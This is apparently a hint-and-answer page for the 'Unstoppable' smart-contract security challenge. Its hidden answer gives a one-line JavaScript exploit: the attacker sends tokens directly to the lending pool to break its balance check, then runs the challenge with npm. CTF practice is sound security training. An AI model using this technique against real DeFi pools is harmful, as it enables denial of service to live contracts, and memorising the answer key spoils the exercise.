# Unstoppable

**HINT:** Look at the ```depositTokens()``` function and how it works

<details>
<summary>Answer</summary>
<p>

A simple token transfer will do the job
```js
await this.token.transfer(this.pool.address, INITIAL_ATTACKER_BALANCE, { from: attacker });
```

```sh
npm run unstoppable.challenge.js
```

</p>
</details>